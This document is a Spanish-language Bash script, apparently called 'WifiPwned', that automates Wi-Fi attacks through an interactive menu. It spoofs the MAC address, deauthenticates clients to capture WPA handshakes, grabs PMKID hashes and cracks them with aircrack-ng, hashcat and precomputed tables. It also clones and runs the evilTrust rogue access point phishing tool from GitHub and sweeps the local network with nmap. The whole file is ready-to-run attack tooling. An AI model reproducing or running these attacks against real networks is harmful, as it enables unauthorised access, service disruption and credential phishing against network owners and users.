#!/bin/bash

# Modulo de colores 
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"
cleancolor="echo -e "${endColour}""
# Comprobacion e instalacion de la dependencias
programs() {
	clear; tput civis
	
	test -f /usr/bin/macchanger
	mactest=$(echo $?)
	if [ $mactest -eq 0 ]; then
		echo -e "\n${greenColour}[*] Comprobando dependencias necesarias...\n"
		sleep 0.5
		echo -e "\n${greenColour}[+] macchanger listo"
	else
		echo -e "${blueColour}[*] Instalando macchanger..."
		sudo apt-get install macchanger -y
		clear
		echo -e "\n${greenColour}[*] Comprobando dependencias necesarias...\n"
	fi
	
	dependencias=(aircrack-ng xterm hashcat git nmap hcxtools net-tools)
	for program in "${dependencias[@]}"; do
		test -f /usr/bin/$program
		if [ "$(echo $?)" -eq 0 ]; then
			echo -e "\n${greenColour}[+] $program listo"
			sleep 0.5
		else 
			echo -e "\n${redColour}[-] $program no instalado"
			sleep 1
			echo -e "\n${blueColour}[*] Instalando ${program}..." 
			sudo apt-get install $program -y > /dev/null 2>&1

		fi
	done
}
# 1) ataque
handshake_ataque() {
	clear
	echo -e "\n${turquoiseColour}[*] Iniciando Ataque Handshake"
	sleep 1
	xterm -hold -e "airodump-ng ${tar}mon" &
	airodump_xterm_PID=$!
	echo -e "$grayColour"
 	tput cnorm
    read -p "[?] Que red deseas atacar?: " ap
	read -p "[?] En que canal esta ${ap}?: " channel
	tput civis
	$cleancolor
	echo -e "${greenColour}[*] Se esta desautenticando a los usuarios de la red"
	$cleancolor
	kill -9 $airodump_xterm_PID
	wait $airodump_xterm_PID 2>/dev/null

	xterm -hold -e "airodump-ng -c $channel -w Handshake --essid $ap ${tar}mon" &
	airodump_filter_xterm_PID=$!

	sleep 5; xterm -hold -e "aireplay-ng -0 10 -e $ap -c FF:FF:FF:FF:FF:FF ${tar}mon" &								
	aireplay_xterm_PID=$!
	sleep 10; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2>/dev/null

	echo -e "${redColour}\n[%] Esperando Handshake\n"
	$cleancolor
								
	sleep 10; kill -9 $airodump_filter_xterm_PID
	wait $airodump_filter_xterm_PID 2>/dev/null
	test -f Handshake-01.cap
	if [ "$(echo $?)" == "0" ]; then
		tput cnorm
		echo -e "\n${yellowColour}[*] Ruta de rockyou.txt: /usr/share/wordlists/rockyou.txt"
		read -p "[?] Ruta del Diccionario al usar: " dicc
		$cleancolor; tput civis
		xterm -hold -e "aircrack-ng -w $dicc Handshake-01.cap"

		echo -e "\n${redColour}[*] Saliendo y reiniciando la tarjeta de red...\n" 
		airmon-ng stop ${tar}mon > /dev/null 2>&1
		sudo /etc/init.d/networking start > /dev/null 2>&1
		sudo /etc/init.d/networking restart > /dev/null 2>&1
		sudo systemctl start NetworkManager > /dev/null 2>&1
		ifconfig $tar up > /dev/null 2>&1
		sudo rm Handshake* > /dev/null 2>&1
	else 
		echo -e "${redColour}\n [!] No se ha capturado el Handshake"
	fi
}
# salida
salir() {
	echo -e "\n${redColour}[*] Saliendo y reiniciando la tarjeta de red...\n" 
	airmon-ng stop ${tar}mon > /dev/null 2>&1
	sudo /etc/init.d/networking start > /dev/null 2>&1
	sudo /etc/init.d/networking restart > /dev/null 2>&1
	sudo systemctl start NetworkManager > /dev/null 2>&1
	ifconfig $tar up > /dev/null 2>&1
	sudo rm Handshake* > /dev/null 2>&1
	tput cnorm
	exit
}

# 2) ataque
pkmid_ataque() {
	clear
	echo -e "\n${greenColour}[*] Iniciando ataque PMKID..\n"
	sleep 1 
	echo -e "${blueColour}[!] Recomendacion: 600 segundos (10 minutos)"
	read -p "[?] Cuantos segundos quieres que dure la captura de los paquetes?: " seg
	$cleancolor
	xterm -hold -e "hcxdumptool -i ${tar}mon --enable_status=1 -o Captura" & # --filtermode=2 --filterlist_ap= -c  Futura actualizacion
	hcxdumptool_PID=$!
	sleep ${seg}; kill -9 $hcxdumptool_PID; wait $hcxdumptool_PID 2>/dev/null
    echo -e "\n${redColour}[%] Capturando Hashes\n"
	hcxcaptool -z HASHPMKID Captura; sudo rm Capruta 2>/dev/null
	sleep 1
	$cleancolor
	test -f HASHPMKID*
	if [ "$(echo $?)" -eq 0 ]; then
		echo -e "\n${yellowColour}[*] Iniciando ataque de fuerza bruta"
		sleep 1
		tput cnorm
		echo -e "\n${blueColour}[*] Ruta de rockyou.txt: /usr/share/wordlists/rockyou.txt${endColour}"
		read -p "[?] Ruta del Diccionario al usar: " dicc1
		tput civis; echo -e "\n${yellowColour}[*] Preparando el paquete para hacer fuerza bruta..."
		hashcat -m 16800 $dicc1 HASHPMKID -d 1 --force
	else 
		echo -e "\n${redColour}[!] No se pudo capturar el paquete necesario"
		exit
	fi
}
# 3) ataque
fuerza_.cap() {
	clear; echo -e "\n${greenColour}[*] Iniciando Ataque de Fuerza Bruta"
	sleep 1
	echo -e "\n${yellowColour}[*] Ruta de rockyou.txt: /usr/share/wordlists/rockyou.txt"
	$cleancolor
	tput cnorm
	read -p "[?] Nombre del archivo .cap: " cap
	tput civis; read -p "[?] Ruta del Diccionario al usar: " dicc
	xterm -hold -e "aircrack-ng -w $dicc $cap"
}

fuerza_rainbow() {
	read -p "[?] Nombre del archivo .cap: " cap
	xterm -hold -e "aircrack-ng -r dicc-hasheado $cap" 
}

rainbowtaibles() {
	clear; echo -e "\n${yellowColour}[*] Iniciando..."
	read -p "[?] Ruta del diccionario: " ruta
	airolib-ng dicc-hasheado --import passwd $ruta > /dev/null 2>&1
	test -f dicc-hasheado
	if [ "$(echo $?)" -eq 0 ]; then
		read -p "[?] Nombre o essid de la red: " ap 
		echo "$ap" > essid.lst
		airolib-ng dicc-hasheado --import essid essid.lst > /dev/null 2>&1
		airolib-ng dicc-hasheado --clean all 
		read -p "[?] Cuanto quieres que dure el proceso de hasheo?: " seg
		xterm -hold -e "airolib-ng dicc-hasheado --batch" & 
		batch_PID=$!
		sleep ${seg}; kill -9 $batch_PID; wait $batch_PID 2>/dev/null
		read -p "[?] Quieres hacer un ataque de fuerza bruta con el diccionario? [Y/N]: " attak
		if [ "$attak" == "Y" ] || [ "$attak" == "y" ]; then
			fuerza_rainbow
		else
			echo -e "\n${redColour}[!] Saliendo"
		fi
	else
		echo -e "\n${redColour}[!] No se pudo crear el diccionario o pusiste mal la ruta del diccionario"
		sleep 2
	fi
}

menuforce() {
	clear; echo -e "${yellowColour}\n1) Ataque Fuerza bruta (.cap)"
	echo -e "2) Crear diccionario hasheado (Rainbow taibles)"
	echo -e "3) Ataque fuerza bruta con diccionario hasheado"
	echo -e "4) Salir"
	echo -e "${greenColour}"; read -p "Seleccione una opcion: " force 
	case $force in 
	1)
	fuerza_.cap
	;;
	2)
	rainbowtaibles
	;;
	3)
	fuerza_rainbow
	;;
	4)
	echo -e "\n[*] Saliendo..."
	;;
	*)
	echo -e "${redColour}\n[!] OpciÃ³n invÃ¡lida"
	sleep 2
	;;
	esac
}


# 4) ataque
evil_ataque() {
	clear; echo -e "\n${grayColour}[*] Iniciando Ataque evilTrust by S4vitar..."
	airmon-ng stop ${tar}mon > /dev/null 2>&1
	sudo /etc/init.d/networking start > /dev/null 2>&1
	sudo /etc/init.d/networking restart > /dev/null 2>&1
	sudo systemctl start NetworkManager > /dev/null 2>&1
	ifconfig $tar up > /dev/null 2>&1
	sleep 10
	echo -e "${blueColour}\n[*] Clonando el programa..."
	git clone https://github.com/Kidd3n/evilTrust.git > /dev/null 2>&1
	cd evilTrust
	chmod 755 evilTrust.sh
	sudo ./evilTrust.sh -m terminal
	cd .. 
	sudo rm -r evilTrust
}
# 5) ataque
scanner() {
	clear; echo -e "\n${greenColour}[*] Iniciando Scanner de la red"
	airmon-ng stop ${tar}mon > /dev/null 2>&1
	sudo /etc/init.d/networking start > /dev/null 2>&1
	sudo /etc/init.d/networking restart > /dev/null 2>&1
	sudo systemctl start NetworkManager > /dev/null 2>&1
	ifconfig $tar up > /dev/null 2>&1
	sleep 10
	read -p "[?] Cual es tu subred? (Ejemplo: 192.168.1): " ipnmap
	tput civis; echo -e "\n---------------------------------------------------\n"
	nmap -sP -Pn ${ipnmap}.0/24 | grep '(' | sed 's/^.*for //' | sed 's/Nmap.*//' | sed '1,2d'
	echo -e "\n---------------------------------------------------"
	read -p "Enter para salir"
	tput cnorm
}
menunomon() {
	clear; echo -e "${yellowColour}\n1) Menu fuerza bruta"
	echo -e "2) Scanner de la red local"
	echo -e "3) Salir"
	echo -e "${greenColour}"; read -p "Seleccione una opcion: " force 
	case $force in 
	1)
	menuforce
	;;
	2)
	scanner
	;;
	3)
	echo -e "\n[*] Saliendo..."
	;;
	*)
	echo -e "${redColour}\n[!] OpciÃ³n invÃ¡lida"
	sleep 2
	;;
	esac
}
# Comprobacion si el usuario es root
if [ $(id -u) -ne 0 ]; then
	echo -e "$redColour\n[!] Debes ser root para ejecutar la herramienta -> (sudo $0)\n"
	exit 1
# Programa principal
else
	programs
	clear
	echo -e "${turquoiseColour}"
	echo " ( ( ( /\ ) ) )  "
	echo "      /\/\      "  
	echo "     /\/\/\      " 
	echo "    /)/\/\(\   "
	echo "   /\/\/\/\/\ "
	echo "  / O O O O  \ "
	echo "WifiPwned ByKidd3n"
	echo "/\/\/\/\/\/\/\/\ "
	echo -e "${purpleColour}"
	echo "[+] Github: https://github.com/kidd3n"
	read -p "[+] Enter para continuar"
	$cleancolor
	tput cnorm
	echo -e "\n${grayColour}[*] Recomendable y necesario para algunos ataques"
	read -p "[?] Quieres poner en modo monitor tu targeta de red? [Y/N]: " mon
	$cleancolor
		if [ "$mon" == "Y" ] || [ "$mon" == "y" ]; then 
			echo -e "$blueColour"; iwconfig | awk '$1~/^[a-z]+[0-9]+/{print $1}'
			echo -e "\n"; read -p "[?] Que tarjeta deseas usar: " tar
			$cleancolor
			tput civis; echo -e "\n${redColour}[*] Se esta iniciando el modo monitor y cambiando tu dirrecion MAC en $tar\n"
			airmon-ng start $tar > /dev/null 2>&1
			ifconfig ${tar}mon down && macchanger -a ${tar}mon > /dev/null 2>&1
			ifconfig ${tar}mon up
			airmon-ng check kill > /dev/null 2>&1
			echo -e "\n${yellowColour}[*] Nueva direccion MAC asignada: $(macchanger -s ${tar}mon | grep -i current | xargs | cut -d ' ' -f '3-100')"
			echo -e "\n${greenColour}[*] Ya tienes tu tarjeta preparada!\n"
			tput cnorm; read -p "[?] Quieres hacer un ataque? [Y/N]: " rps
			tput civis; $cleancolor
			if [ "$rps" == "Y" ] || [ "$rps" == "y" ]; then
				while true; do
				clear
				echo -e "${grayColour}\n[+] Menu de ataques\n${endColour}"
				echo -e "${redColour}"
				echo -e "   #"
				echo -e "    #	                             ( ( \ )  ( / ) )"
				echo -e "    ###=====================\      	  \----/"
				echo -e "    ###= WifiPwneed by kidd3n ----->  	  |    |"
				echo -e "    ###=====================/             +----+"
				echo -e "    #"
				echo -e "   #"
				sleep 0.5
				echo -e "${blueColour}\n[+] Targeta de Red: ${tar}mon" 
				echo -e "${blueColour}[+] Direccion MAC: $(macchanger --show ${tar}mon | grep "Current MAC" | awk '{print $3}')"
				echo -e "${grayColour}\n[+] Hacking Wifi\t\t[+] Wifiphisher\t\t[+] Cracking password"
				echo -e "${yellowColour}\n1) Ataque Handshake\t\t\n4) EvilTrust (S4vitar)\t\t\n5) Ataque Fuerza bruta (.cap)"
				echo -e "2) Ataque PMKID\t\t\t\t\t6) Crear diccionario hasheado (Rainbow taibles)"
				echo -e "3) Scanner de la red local"
				echo -e "\n7) Salir"
				tput cnorm
				echo -e "${greenColour}"; read -p "[?] Seleccione un ataque: " opcion
				$cleancolor
				case $opcion in
				1)
				handshake_ataque
				;;
				2)
				pkmid_ataque
				;;
				3)
				scanner
				;;
				4)
				evil_ataque
				;;
				5)
				fuerza_.cap
				;;
				6)
				rainbowtaibles
				;;
				7)
				salir
				;;
				*)
				echo -e "${redColour}\n[!] OpciÃ³n invÃ¡lida"
				sleep 2
				;;
				esac
				done
			fi
			if [ "$rps" == "N" ] || [ "$rps" == "n" ]; then
				echo -e "${redColour}\n[!] Saliendo"
				$cleancolor
				tput cnorm
				exit
			fi
		else
			menunomon
		fi

fi